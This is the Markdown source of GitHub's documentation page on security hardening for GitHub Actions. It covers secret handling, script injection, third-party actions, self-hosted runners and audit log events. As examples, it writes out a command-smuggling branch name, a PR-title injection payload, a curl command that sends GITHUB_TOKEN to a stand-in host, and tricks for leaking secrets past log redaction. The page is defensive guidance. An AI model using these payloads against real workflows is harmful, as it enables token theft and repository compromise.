---
title: Security hardening for GitHub Actions
shortTitle: Security hardening
intro: 'Good security practices for using {% data variables.product.prodname_actions %} features.'
redirect_from:
  - /actions/getting-started-with-github-actions/security-hardening-for-github-actions
  - /actions/learn-github-actions/security-hardening-for-github-actions
versions:
  fpt: '*'
  ghes: '*'
  ghae: '*'
  ghec: '*'
type: overview
topics:
  - Security
miniTocMaxHeadingLevel: 3
---

{% data reusables.actions.enterprise-beta %}
{% data reusables.actions.enterprise-github-hosted-runners %}

## Overview

This guide explains how to configure security hardening for certain {% data variables.product.prodname_actions %} features. If the {% data variables.product.prodname_actions %} concepts are unfamiliar, see "[Core concepts for GitHub Actions](/actions/getting-started-with-github-actions/core-concepts-for-github-actions)."

## Using secrets

Sensitive values should never be stored as plaintext in workflow files, but rather as secrets. [Secrets](/actions/configuring-and-managing-workflows/creating-and-storing-encrypted-secrets) can be configured at the organization, repository, or environment level, and allow you to store sensitive information in {% data variables.product.product_name %}.

Secrets use [Libsodium sealed boxes](https://libsodium.gitbook.io/doc/public-key_cryptography/sealed_boxes), so that they are encrypted before reaching {% data variables.product.product_name %}. This occurs when the secret is submitted [using the UI](/actions/configuring-and-managing-workflows/creating-and-storing-encrypted-secrets#creating-encrypted-secrets-for-a-repository) or through the [REST API](/rest/reference/actions#secrets). This client-side encryption helps minimize the risks related to accidental logging (for example, exception logs and request logs, among others) within {% data variables.product.product_name %}'s infrastructure. Once the secret is uploaded, {% data variables.product.product_name %} is then able to decrypt it so that it can be injected into the workflow runtime.

To help prevent accidental disclosure, {% data variables.product.product_name %} uses a mechanism that attempts to redact any secrets that appear in run logs. This redaction looks for exact matches of any configured secrets, as well as common encodings of the values, such as Base64. However, because there are multiple ways a secret value can be transformed, this redaction is not guaranteed. As a result, there are certain proactive steps and good practices you should follow to help ensure secrets are redacted, and to limit other risks associated with secrets:

- **Never use structured data as a secret**
    - Structured data can cause secret redaction within logs to fail, because redaction largely relies on finding an exact match for the specific secret value. For example, do not use a blob of JSON, XML, or YAML (or similar) to encapsulate a secret value, as this significantly reduces the probability the secrets will be properly redacted. Instead, create individual secrets for each sensitive value.
- **Register all secrets used within workflows**
    - If a secret is used to generate another sensitive value within a workflow, that generated value should be formally [registered as a secret](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret), so that it will be redacted if it ever appears in the logs. For example, if using a private key to generate a signed JWT to access a web API, be sure to register that JWT as a secret or else it won’t be redacted if it ever enters the log output.
    - Registering secrets applies to any sort of transformation/encoding as well. If your secret is transformed in some way (such as Base64 or URL-encoded), be sure to register the new value as a secret too.
- **Audit how secrets are handled**
    - Audit how secrets are used, to help ensure they’re being handled as expected. You can do this by reviewing the source code of the repository executing the workflow, and checking any actions used in the workflow. For example, check that they’re not sent to unintended hosts, or explicitly being printed to log output.
    - View the run logs for your workflow after testing valid/invalid inputs, and check that secrets are properly redacted, or not shown. It's not always obvious how a command or tool you’re invoking will send errors to `STDOUT` and `STDERR`, and secrets might subsequently end up in error logs. As a result, it is good practice to manually review the workflow logs after testing valid and invalid inputs.
- **Use credentials that are minimally scoped**
    - Make sure the credentials being used within workflows have the least privileges required, and be mindful that any user with write access to your repository has read access to all secrets configured in your repository. {% ifversion fpt or ghes > 3.1 or ghae or ghec %}
    - Actions can use the `GITHUB_TOKEN` by accessing it from the `github.token` context. For more information, see "[Contexts](/actions/learn-github-actions/contexts#github-context)." You should therefore make sure that the `GITHUB_TOKEN` is granted the minimum required permissions. It's good security practice to set the default permission for the `GITHUB_TOKEN` to read access only for repository contents. The permissions can then be increased, as required, for individual jobs within the workflow file. For more information, see "[Authentication in a workflow](/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token)." {% endif %}
- **Audit and rotate registered secrets**
    - Periodically review the registered secrets to confirm they are still required. Remove those that are no longer needed.
    - Rotate secrets periodically to reduce the window of time during which a compromised secret is valid.
- **Consider requiring review for access to secrets**
    - You can use required reviewers to protect environment secrets. A workflow job cannot access environment secrets until approval is granted by a reviewer. For more information about storing secrets in environments or requiring reviews for environments, see "[Encrypted secrets](/actions/reference/encrypted-secrets)" and "[Using environments for deployment](/actions/deployment/using-environments-for-deployment)."

{% warning %}

**Warning**: Any user with write access to your repository has read access to all secrets configured in your repository. Therefore, you should ensure that the credentials being used within workflows have the least privileges required.

{% endwarning %}

## Using `CODEOWNERS` to monitor changes

You can use the `CODEOWNERS` feature to control how changes are made to your workflow files. For example, if all your workflow files are stored in `.github/workflows`, you can add this directory to the code owners list, so that any proposed changes to these files will first require approval from a designated reviewer.

For more information, see "[About code owners](/github/creating-cloning-and-archiving-repositories/about-code-owners)."

## Understanding the risk of script injections

When creating workflows, [custom actions](/actions/creating-actions/about-actions), and [composite actions](/actions/creating-actions/creating-a-composite-action) actions, you should always consider whether your code might execute untrusted input from attackers. This can occur when an attacker adds malicious commands and scripts to a context. When your workflow runs, those strings might be interpreted as code which is then executed on the runner.

 Attackers can add their own malicious content to the [`github` context](/actions/reference/context-and-expression-syntax-for-github-actions#github-context), which should be treated as potentially untrusted input. These contexts typically end with `body`, `default_branch`, `email`, `head_ref`, `label`, `message`, `name`, `page_name`,`ref`, and `title`.  For example: `github.event.issue.title`, or `github.event.pull_request.body`. 
 
 You should ensure that these values do not flow directly into workflows, actions, API calls, or anywhere else where they could be interpreted as executable code. By adopting the same defensive programming posture you would use for any other privileged application code, you can help security harden your use of {% data variables.product.prodname_actions %}. For information on some of the steps an attacker could take, see ["Potential impact of a compromised runner](/actions/learn-github-actions/security-hardening-for-github-actions#potential-impact-of-a-compromised-runner)."

In addition, there are other less obvious sources of potentially untrusted input, such as branch names and email addresses, which can be quite flexible in terms of their permitted content. For example, `zzz";echo${IFS}"hello";#` would be a valid branch name and would be a possible attack vector for a target repository.

The following sections explain how you can help mitigate the risk of script injection.

### Example of a script injection attack

A script injection attack can occur directly within a workflow's inline script. In the following example, an action uses an expression to test the validity of a pull request title, but also adds the risk of script injection:

{% raw %}
```
      - name: Check PR title
        run: |
          title="${{ github.event.pull_request.title }}"
          if [[ $title =~ ^octocat ]]; then
          echo "PR title starts with 'octocat'"
          exit 0
          else
          echo "PR title did not start with 'octocat'"
          exit 1
          fi
```
{% endraw %}

This example is vulnerable to script injection because the `run` command executes within a temporary shell script on the runner. Before the shell script is run, the expressions inside {% raw %}`${{ }}`{% endraw %} are evaluated and then substituted with the resulting values, which can make it vulnerable to shell command injection. 

To inject commands into this workflow, the attacker could create a pull request with a title of  `a"; ls $GITHUB_WORKSPACE"`:

![Example of script injection in PR title](/assets/images/help/images/example-script-injection-pr-title.png)

In this example, the `"` character is used to interrupt the {% raw %}`title="${{ github.event.pull_request.title }}"`{% endraw %} statement, allowing the `ls` command to be executed on the runner. You can see the output of the `ls` command in the log:

![Example result of script injection](/assets/images/help/images/example-script-injection-result.png)

## Good practices for mitigating script injection attacks

There are a number of different approaches available to help you mitigate the risk of script injection:

### Using an action instead of an inline script (recommended)

The recommended approach is to create an action that processes the context value as an argument. This approach is not vulnerable to the injection attack, as the context value is not used to generate a shell script, but is instead passed to the action as an argument:

{% raw %}
```
uses: fakeaction/checktitle@v3
with:
    title: ${{ github.event.pull_request.title }}
```
{% endraw %}

### Using an intermediate environment variable

For inline scripts, the preferred approach to handling untrusted input is to set the value of the expression to an intermediate environment variable.

The following example uses Bash to process the `github.event.pull_request.title` value as an environment variable:

{% raw %}
```
      - name: Check PR title
        env:
          TITLE: ${{ github.event.pull_request.title }}
        run: |
          if [[ "$TITLE" =~ ^octocat ]]; then
          echo "PR title starts with 'octocat'"
          exit 0
          else
          echo "PR title did not start with 'octocat'"
          exit 1
          fi
```
{% endraw %}

In this example, the attempted script injection is unsuccessful:

![Example of mitigated script injection](/assets/images/help/images/example-script-injection-mitigated.png)

With this approach, the value of the {% raw %}`${{ github.event.issue.title }}`{% endraw %} expression is stored in memory and used as a variable, and doesn't interact with the script generation process. In addition, consider using double quote shell variables to avoid [word splitting](https://github.com/koalaman/shellcheck/wiki/SC2086), but this is [one of many](https://mywiki.wooledge.org/BashPitfalls) general recommendations for writing shell scripts, and is not specific to {% data variables.product.prodname_actions %}.

{% ifversion fpt or ghec %}
### Using starter workflows for code scanning

{% data reusables.advanced-security.starter-workflows-beta %}
{% data variables.product.prodname_code_scanning_capc %} allows you to find security vulnerabilities before they reach production. {% data variables.product.product_name %} provides starter workflows for {% data variables.product.prodname_code_scanning %}. You can use these suggested workflows to construct your {% data variables.product.prodname_code_scanning %} workflows, instead of starting from scratch. {% data variables.product.company_short%}'s workflow, the {% data variables.product.prodname_codeql_workflow %}, is powered by {% data variables.product.prodname_codeql %}. There are also third-party starter workflows available.

For more information, see "[About {% data variables.product.prodname_code_scanning %}](/code-security/code-scanning/automatically-scanning-your-code-for-vulnerabilities-and-errors/about-code-scanning)" and "[Setting up {% data variables.product.prodname_code_scanning %} using starter workflows](/code-security/code-scanning/automatically-scanning-your-code-for-vulnerabilities-and-errors/setting-up-code-scanning-for-a-repository#setting-up-code-scanning-using-starter-workflows)."

{% endif %}

### Restricting permissions for tokens

To help mitigate the risk of an exposed token, consider restricting the assigned permissions. For more information, see "[Modifying the permissions for the GITHUB_TOKEN](/actions/reference/authentication-in-a-workflow#modifying-the-permissions-for-the-github_token)."

{% ifversion fpt or ghec or ghae-issue-4856 or ghes > 3.4 %}

## Using OpenID Connect to access cloud resources

{% data reusables.actions.about-oidc-short-overview %}

{% endif %}

## Using third-party actions

The individual jobs in a workflow can interact with (and compromise) other jobs. For example, a job querying the environment variables used by a later job, writing files to a shared directory that a later job processes, or even more directly by interacting with the Docker socket and inspecting other running containers and executing commands in them.

This means that a compromise of a single action within a workflow can be very significant, as that compromised action would have access to all secrets configured on your repository, and may be able to use the `GITHUB_TOKEN` to write to the repository. Consequently, there is significant risk in sourcing actions from third-party repositories on {% data variables.product.prodname_dotcom %}. For information on some of the steps an attacker could take, see ["Potential impact of a compromised runner](/actions/learn-github-actions/security-hardening-for-github-actions#potential-impact-of-a-compromised-runner)."

You can help mitigate this risk by following these good practices:

* **Pin actions to a full length commit SHA**

  Pinning an action to a full length commit SHA is currently the only way to use an action as an immutable release. Pinning to a particular SHA helps mitigate the risk of a bad actor adding a backdoor to the action's repository, as they would need to generate a SHA-1 collision for a valid Git object payload.

  

* **Audit the source code of the action**

  Ensure that the action is handling the content of your repository and secrets as expected. For example, check that secrets are not sent to unintended hosts, or are not inadvertently logged.

* **Pin actions to a tag only if you trust the creator**

  Although pinning to a commit SHA is the most secure option, specifying a tag is more convenient and is widely used. If you’d like to specify a tag, then be sure that you trust the action's creators. The ‘Verified creator’ badge on {% data variables.product.prodname_marketplace %} is a useful signal, as it indicates that the action was written by a team whose identity has been verified by {% data variables.product.prodname_dotcom %}. Note that there is risk to this approach even if you trust the author, because a tag can be moved or deleted if a bad actor gains access to the repository storing the action.

{% ifversion fpt or ghes > 3.3 or ghae-issue-4757 or ghec %}
## Reusing third-party workflows

The same principles described above for using third-party actions also apply to using third-party workflows. You can help mitigate the risks associated with reusing workflows by following the same good practices outlined above. For more information, see "[Reusing workflows](/actions/learn-github-actions/reusing-workflows)." 
{% endif %}

{% if internal-actions %}
## Allowing workflows to access internal repositories

{% data reusables.actions.outside-collaborators-internal-actions %} For more information, see "[Sharing actions and workflows with your enterprise](/actions/creating-actions/sharing-actions-and-workflows-with-your-enterprise)."
{% endif %}

## Using OpenSSF Scorecards to secure workflows

[Scorecards](https://github.com/ossf/scorecard) is an automated security tool that flags risky supply chain practices. You can use the [Scorecards action](https://github.com/marketplace/actions/ossf-scorecard-action) and [starter workflow](https://github.com/actions/starter-workflows) to follow best security practices. Once configured, the Scorecards action runs automatically on repository changes, and alerts developers about risky supply chain practices using the built-in code scanning experience. The Scorecards project runs a number of checks, including script injection attacks, token permissions, and pinned actions.

## Potential impact of a compromised runner

These sections consider some of the steps an attacker can take if they're able to run malicious commands on a {% data variables.product.prodname_actions %} runner. 

### Accessing secrets

Workflows triggered using the `pull_request` event have read-only permissions and have no access to secrets. However, these permissions differ for various event triggers such as `issue_comment`, `issues` and `push`, where the attacker could attempt to steal repository secrets or use the write permission of the job's [`GITHUB_TOKEN`](/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token). 

- If the secret or token is set to an environment variable, it can be directly accessed through the environment using `printenv`.
- If the secret is used directly in an expression, the generated shell script is stored on-disk and is accessible.
- For a custom action, the risk can vary depending on how a program is using the secret it obtained from the argument:

  {% raw %}
  ```
  uses: fakeaction/publish@v3
  with:
      key: ${{ secrets.PUBLISH_KEY }}
  ```
  {% endraw %}

Although {% data variables.product.prodname_actions %} scrubs secrets from memory that are not referenced in the workflow (or an included action), the `GITHUB_TOKEN` and any referenced secrets can be harvested by a determined attacker.

### Exfiltrating data from a runner

An attacker can exfiltrate any stolen secrets or other data from the runner. To help prevent accidental secret disclosure, {% data variables.product.prodname_actions %} [automatically redact secrets printed to the log](/actions/reference/encrypted-secrets#accessing-your-secrets), but this is not a true security boundary because secrets can be intentionally sent to the log. For example, obfuscated secrets can be exfiltrated using `echo ${SOME_SECRET:0:4}; echo ${SOME_SECRET:4:200};`. In addition, since the attacker may run arbitrary commands, they could use HTTP requests to send secrets or other repository data to an external server.

### Stealing the job's `GITHUB_TOKEN`

It is possible for an attacker to steal a job's `GITHUB_TOKEN`. The {% data variables.product.prodname_actions %} runner automatically receives a generated `GITHUB_TOKEN` with permissions that are limited to just the repository that contains the workflow, and the token expires after the job has completed. Once expired, the token is no longer useful to an attacker. To work around this limitation, they can automate the attack and perform it in fractions of a second by calling an attacker-controlled server with the token, for example: `a"; set +e; curl http://example.lab?token=$GITHUB_TOKEN;#`.

### Modifying the contents of a repository

The attacker server can use the {% ifversion fpt or ghec %}{% data variables.product.prodname_dotcom %}{% else %}{% data variables.product.product_name %}{% endif %} API to [modify repository content](/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token), including releases, if the assigned permissions of `GITHUB_TOKEN` [are not restricted](/actions/reference/authentication-in-a-workflow#modifying-the-permissions-for-the-github_token).

## Considering cross-repository access

{% data variables.product.prodname_actions %} is intentionally scoped for a single repository at a time. The `GITHUB_TOKEN` grants the same level of access as a write-access user, because any write-access user can access this token by creating or modifying a workflow file{% ifversion fpt or ghes > 3.1 or ghae or ghec %}, elevating the permissions of the `GITHUB_TOKEN` if necessary{% endif %}. Users have specific permissions for each repository, so allowing the `GITHUB_TOKEN` for one repository to grant access to another would impact the {% data variables.product.prodname_dotcom %} permission model if not implemented carefully. Similarly, caution must be taken when adding {% data variables.product.prodname_dotcom %} authentication tokens to a workflow, because this can also affect the {% data variables.product.prodname_dotcom %} permission model by inadvertently granting broad access to collaborators.

We have [a plan on the {% data variables.product.prodname_dotcom %} roadmap](https://github.com/github/roadmap/issues/74) to support a flow that allows cross-repository access within {% data variables.product.product_name %}, but this is not yet a supported feature. Currently, the only way to perform privileged cross-repository interactions is to place a {% data variables.product.prodname_dotcom %} authentication token or SSH key as a secret within the workflow. Because many authentication token types do not allow for granular access to specific resources, there is significant risk in using the wrong token type, as it can grant much broader access than intended.

This list describes the recommended approaches for accessing repository data within a workflow, in descending order of preference:

1. **The `GITHUB_TOKEN`**
    -  This token is intentionally scoped to the single repository that invoked the workflow, and {% ifversion fpt or ghes > 3.1 or ghae or ghec %}can have {% else %}has {% endif %}the same level of access as a write-access user on the repository. The token is created before each job begins and expires when the job is finished. For more information, see "[Authenticating with the GITHUB_TOKEN](/actions/configuring-and-managing-workflows/authenticating-with-the-github_token)."
    - The `GITHUB_TOKEN` should be used whenever possible.
2. **Repository deploy key**
    - Deploy keys are one of the only credential types that grant read or write access to a single repository, and can be used to interact with another repository within a workflow. For more information, see "[Managing deploy keys](/developers/overview/managing-deploy-keys#deploy-keys)."
    - Note that deploy keys can only clone and push to the repository using Git, and cannot be used to interact with the REST or GraphQL API, so they may not be appropriate for your requirements.
3. **{% data variables.product.prodname_github_app %} tokens**
    - {% data variables.product.prodname_github_apps %} can be installed on select repositories, and even have granular permissions on the resources within them. You could create a {% data variables.product.prodname_github_app %} internal to your organization, install it on the repositories you need access to within your workflow, and authenticate as the installation within your workflow to access those repositories.
4. **Personal access tokens**
    - You should never use personal access tokens from your own account. These tokens grant access to all repositories within the organizations that you have access to, as well as all personal repositories in your personal account. This indirectly grants broad access to all write-access users of the repository the workflow is in. In addition, if you later leave an organization, workflows using this token will immediately break, and debugging this issue can be challenging.
    - If a personal access token is used, it should be one that was generated for a new account that is only granted access to the specific repositories that are needed for the workflow. Note that this approach is not scalable and should be avoided in favor of alternatives, such as deploy keys.
5. **SSH keys on a personal account**
    - Workflows should never use the SSH keys on a personal account. Similar to personal access tokens, they grant read/write permissions to all of your personal repositories as well as all the repositories you have access to through organization membership.  This indirectly grants broad access to all write-access users of the repository the workflow is in. If you're intending to use an SSH key because you only need to perform repository clones or pushes, and do not need to interact with public APIs, then you should use individual deploy keys instead.

## Hardening for self-hosted runners

{% ifversion fpt or ghec %}
**{% data variables.product.prodname_dotcom %}-hosted** runners execute code within ephemeral and clean isolated virtual machines, meaning there is no way to persistently compromise this environment, or otherwise gain access to more information than was placed in this environment during the bootstrap process.
{% endif %}

{% ifversion fpt or ghec %}**Self-hosted**{% elsif ghes or ghae %}Self-hosted{% endif %} runners for {% data variables.product.product_name %} do not have guarantees around running in ephemeral clean virtual machines, and can be persistently compromised by untrusted code in a workflow.

{% ifversion fpt or ghec %}As a result, self-hosted runners should almost [never be used for public repositories](/actions/hosting-your-own-runners/about-self-hosted-runners#self-hosted-runner-security-with-public-repositories) on {% data variables.product.product_name %}, because any user can open pull requests against the repository and compromise the environment. Similarly, be{% elsif ghes or ghae %}Be{% endif %} cautious when using self-hosted runners on private or internal repositories, as anyone who can fork the repository and open a pull request (generally those with read access to the repository) are able to compromise the self-hosted runner environment, including gaining access to secrets and the `GITHUB_TOKEN` which{% ifversion fpt or ghes > 3.1 or ghae or ghec %}, depending on its settings, can grant {% else %} grants {% endif %}write access to the repository. Although workflows can control access to environment secrets by using environments and required reviews, these workflows are not run in an isolated environment and are still susceptible to the same risks when run on a self-hosted runner.

When a self-hosted runner is defined at the organization or enterprise level, {% data variables.product.product_name %} can schedule workflows from multiple repositories onto the same runner. Consequently, a security compromise of these environments can result in a wide impact. To help reduce the scope of a compromise, you can create boundaries by organizing your self-hosted runners into separate groups. You can restrict what {% if restrict-groups-to-workflows %}workflows, {% endif %}organizations and repositories can access runner groups. For more information, see "[Managing access to self-hosted runners using groups](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups)."

You should also consider the environment of the self-hosted runner machines:
- What sensitive information resides on the machine configured as a self-hosted runner? For example, private SSH keys, API access tokens, among others.
- Does the machine have network access to sensitive services? For example, Azure or AWS metadata services. The amount of sensitive information in this environment should be kept to a minimum, and you should always be mindful that any user capable of invoking workflows has access to this environment.

Some customers might attempt to partially mitigate these risks by implementing systems that automatically destroy the self-hosted runner after each job execution. However, this approach might not be as effective as intended, as there is no way to guarantee that a self-hosted runner only runs one job. Some jobs will use secrets as command-line arguments which can be seen by another job running on the same runner, such as `ps x -w`. This can lead to secret leakages.

### Planning your management strategy for self-hosted runners

A self-hosted runner can be added to various levels in your {% data variables.product.prodname_dotcom %} hierarchy: the enterprise, organization, or repository level. This placement determines who will be able to manage the runner:

**Centralized management:**
  - If you plan to have a centralized team own the self-hosted runners, then the recommendation is to add your runners at the highest mutual organization or enterprise level. This gives your team a single location to view and manage your runners. 
  - If you only have a single organization, then adding your runners at the organization level is effectively the same approach, but you might encounter difficulties if you add another organization in the future.

**Decentralized management:**
  - If each team will manage their own self-hosted runners, then the recommendation is to add the runners at the highest level of team ownership. For example, if each team owns their own organization, then it will be simplest if the runners are added at the organization level too. 
  - You could also add runners at the repository level, but this will add management overhead and also increases the numbers of runners you need, since you cannot share runners between repositories.

{% ifversion fpt or ghec or ghae-issue-4856 or ghes > 3.4 %}
### Authenticating to your cloud provider

If you are using {% data variables.product.prodname_actions %} to deploy to a cloud provider, or intend to use HashiCorp Vault for secret management, then its recommended that you consider using OpenID Connect to create short-lived, well-scoped access tokens for your workflow runs. For more information, see "[About security hardening with OpenID Connect](/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect)."

{% endif %}

## Auditing {% data variables.product.prodname_actions %} events

You can use the audit log to monitor administrative tasks in an organization. The audit log records the type of action, when it was run, and which personal account performed the action.

For example, you can use the audit log to track the `org.update_actions_secret` event, which tracks changes to organization secrets:
  ![Audit log entries](/assets/images/help/repository/audit-log-entries.png)

The following tables describe the {% data variables.product.prodname_actions %} events that you can find in the audit log. For more information on using the audit log, see
"[Reviewing the audit log for your organization](/organizations/keeping-your-organization-secure/reviewing-the-audit-log-for-your-organization#searching-the-audit-log)" and "[Reviewing audit logs for your enterprise](/admin/monitoring-activity-in-your-enterprise/reviewing-audit-logs-for-your-enterprise)."

{% ifversion fpt or ghec %}
### Events for environments

| Action | Description
|------------------|-------------------
| `environment.create_actions_secret` | Triggered when a secret is created in an environment. For more information, see ["Environment secrets](/actions/reference/environments#environment-secrets)."
| `environment.delete` | Triggered when an environment is deleted. For more information, see ["Deleting an environment](/actions/reference/environments#deleting-an-environment)."
| `environment.remove_actions_secret` |  Triggered when a secret is removed from an environment. For more information, see ["Environment secrets](/actions/reference/environments#environment-secrets)."
| `environment.update_actions_secret` | Triggered when a secret in an environment is updated. For more information, see ["Environment secrets](/actions/reference/environments#environment-secrets)."
{% endif %}

{% ifversion fpt or ghes or ghec %}
### Events for configuration changes
| Action | Description
|------------------|-------------------
| `repo.actions_enabled` | Triggered when {% data variables.product.prodname_actions %} is enabled for a repository. Can be viewed using the UI. This event is not visible when you access the audit log using the REST API. For more information, see "[Using the REST API](#using-the-rest-api)."
| `repo.update_actions_access_settings` | Triggered when the setting to control how your repository is used by {% data variables.product.prodname_actions %} workflows in other repositories is changed.
{% endif %}

### Events for secret management
| Action | Description
|------------------|-------------------
| `org.create_actions_secret` | Triggered when a {% data variables.product.prodname_actions %} secret is created for an organization. For more information, see "[Creating encrypted secrets for an organization](/actions/reference/encrypted-secrets#creating-encrypted-secrets-for-an-organization)."
| `org.remove_actions_secret` | Triggered when a {% data variables.product.prodname_actions %} secret is removed.
| `org.update_actions_secret` | Triggered when a {% data variables.product.prodname_actions %} secret is updated.
| `repo.create_actions_secret ` | Triggered when a {% data variables.product.prodname_actions %} secret is created for a repository. For more information, see "[Creating encrypted secrets for a repository](/actions/reference/encrypted-secrets#creating-encrypted-secrets-for-a-repository)."
| `repo.remove_actions_secret` | Triggered when a {% data variables.product.prodname_actions %} secret is removed.
| `repo.update_actions_secret` | Triggered when a {% data variables.product.prodname_actions %} secret is updated.

### Events for self-hosted runners
| Action | Description
|------------------|-------------------
| `enterprise.register_self_hosted_runner` | Triggered when a new self-hosted runner is registered. For more information, see "[Adding a self-hosted runner to an enterprise](/actions/hosting-your-own-runners/adding-self-hosted-runners#adding-a-self-hosted-runner-to-an-enterprise)."
| `enterprise.remove_self_hosted_runner` | Triggered when a self-hosted runner is removed.
| `enterprise.runner_group_runners_updated` | Triggered when a runner group's member list is updated. For more information, see "[Set self-hosted runners in a group for an organization](/rest/reference/actions#set-self-hosted-runners-in-a-group-for-an-organization)."{% ifversion fpt or ghes > 3.1  or ghae or ghec %}
| `enterprise.self_hosted_runner_online` | Triggered when the runner application is started. Can only be viewed using the REST API; not visible in the UI or JSON/CSV export. For more information, see "[Checking the status of a self-hosted runner](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)."
| `enterprise.self_hosted_runner_offline` | Triggered when the runner application is stopped. Can only be viewed using the REST API; not visible in the UI or JSON/CSV export. For more information, see "[Checking the status of a self-hosted runner](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)."{% endif %}
| `enterprise.self_hosted_runner_updated` | Triggered when the runner application is updated. Can be viewed using the REST API and the UI. This event is not included when you export the audit log as JSON data or a CSV file. For more information, see "[About self-hosted runners](/actions/hosting-your-own-runners/about-self-hosted-runners#about-self-hosted-runners)" and "[Reviewing the audit log for your organization](/organizations/keeping-your-organization-secure/reviewing-the-audit-log-for-your-organization#exporting-the-audit-log)."
| `org.register_self_hosted_runner` | Triggered when a new self-hosted runner is registered. For more information, see "[Adding a self-hosted runner to an organization](/actions/hosting-your-own-runners/adding-self-hosted-runners#adding-a-self-hosted-runner-to-an-organization)."
| `org.remove_self_hosted_runner` | Triggered when a self-hosted runner is removed. For more information, see [Removing a runner from an organization](/actions/hosting-your-own-runners/removing-self-hosted-runners#removing-a-runner-from-an-organization).
| `org.runner_group_runners_updated` | Triggered when a runner group's list of members is updated. For more information, see "[Set self-hosted runners in a group for an organization](/rest/reference/actions#set-self-hosted-runners-in-a-group-for-an-organization)."
| `org.runner_group_updated` | Triggered when the configuration of a self-hosted runner group is changed. For more information, see "[Changing the access policy of a self-hosted runner group](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#changing-the-access-policy-of-a-self-hosted-runner-group)."{% ifversion fpt or ghes > 3.1 or ghae or ghec %}
| `org.self_hosted_runner_online` | Triggered when the runner application is started. Can only be viewed using the REST API; not visible in the UI or JSON/CSV export. For more information, see "[Checking the status of a self-hosted runner](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)."
| `org.self_hosted_runner_offline` | Triggered when the runner application is stopped. Can only be viewed using the REST API; not visible in the UI or JSON/CSV export. For more information, see "[Checking the status of a self-hosted runner](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)."{% endif %}
| `org.self_hosted_runner_updated` | Triggered when the runner application is updated. Can be viewed using the REST API and the UI; not visible in the JSON/CSV export. For more information, see "[About self-hosted runners](/actions/hosting-your-own-runners/about-self-hosted-runners#about-self-hosted-runners)."
| `repo.register_self_hosted_runner` | Triggered when a new self-hosted runner is registered. For more information, see "[Adding a self-hosted runner to a repository](/actions/hosting-your-own-runners/adding-self-hosted-runners#adding-a-self-hosted-runner-to-a-repository)."
| `repo.remove_self_hosted_runner` | Triggered when a self-hosted runner is removed. For more information, see "[Removing a runner from a repository](/actions/hosting-your-own-runners/removing-self-hosted-runners#removing-a-runner-from-a-repository)."{% ifversion fpt or ghes > 3.1 or ghae or ghec %}
| `repo.self_hosted_runner_online` | Triggered when the runner application is started. Can only be viewed using the REST API; not visible in the UI or JSON/CSV export. For more information, see "[Checking the status of a self-hosted runner](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)."
| `repo.self_hosted_runner_offline` | Triggered when the runner application is stopped. Can only be viewed using the REST API; not visible in the UI or JSON/CSV export. For more information, see "[Checking the status of a self-hosted runner](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)."{% endif %}
| `repo.self_hosted_runner_updated` | Triggered when the runner application is updated. Can be viewed using the REST API and the UI; not visible in the JSON/CSV export. For more information, see "[About self-hosted runners](/actions/hosting-your-own-runners/about-self-hosted-runners#about-self-hosted-runners)."

### Events for self-hosted runner groups
| Action | Description
|------------------|-------------------
| `enterprise.runner_group_created` | Triggered when a self-hosted runner group is created. For more information, see "[Creating a self-hosted runner group for an enterprise](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#creating-a-self-hosted-runner-group-for-an-enterprise)."
| `enterprise.runner_group_removed` | Triggered when a self-hosted runner group is removed. For more information, see "[Removing a self-hosted runner group](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#removing-a-self-hosted-runner-group)."
| `enterprise.runner_group_runner_removed` | Triggered when the REST API is used to remove a self-hosted runner from a group.
| `enterprise.runner_group_runners_added` | Triggered when a self-hosted runner is added to a group. For more information, see "[Moving a self-hosted runner to a group](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#moving-a-self-hosted-runner-to-a-group)."
| `enterprise.runner_group_updated` |Triggered when the configuration of a self-hosted runner group is changed. For more information, see "[Changing the access policy of a self-hosted runner group](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#changing-the-access-policy-of-a-self-hosted-runner-group)."
| `org.runner_group_created` | Triggered when a self-hosted runner group is created. For more information, see "[Creating a self-hosted runner group for an organization](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#creating-a-self-hosted-runner-group-for-an-organization)."
| `org.runner_group_removed` | Triggered when a self-hosted runner group is removed. For more information, see "[Removing a self-hosted runner group](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#removing-a-self-hosted-runner-group)."
| `org.runner_group_updated` | Triggered when the configuration of a self-hosted runner group is changed. For more information, see "[Changing the access policy of a self-hosted runner group](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#changing-the-access-policy-of-a-self-hosted-runner-group)."
| `org.runner_group_runners_added` | Triggered when a self-hosted runner is added to a group. For more information, see "[Moving a self-hosted runner to a group](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#moving-a-self-hosted-runner-to-a-group)."
| `org.runner_group_runner_removed` | Triggered when the REST API is used to remove a self-hosted runner from a group. For more information, see "[Remove a self-hosted runner from a group for an organization](/rest/reference/actions#remove-a-self-hosted-runner-from-a-group-for-an-organization)."

### Events for workflow activities

{% data reusables.actions.actions-audit-events-workflow %}
